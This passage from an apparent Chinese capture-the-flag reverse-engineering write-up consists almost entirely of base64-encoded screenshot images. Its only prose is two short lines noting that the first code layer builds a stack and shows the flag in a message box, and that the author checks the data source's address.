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'/></p>
<p>第一层代码挺简单，就是建一个堆栈，然后把一些数据放堆栈里，最后用消息框输出flag<br>去数据源的地址看一下是什么：</p>
<p><img src='data:img/jpg;base64,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
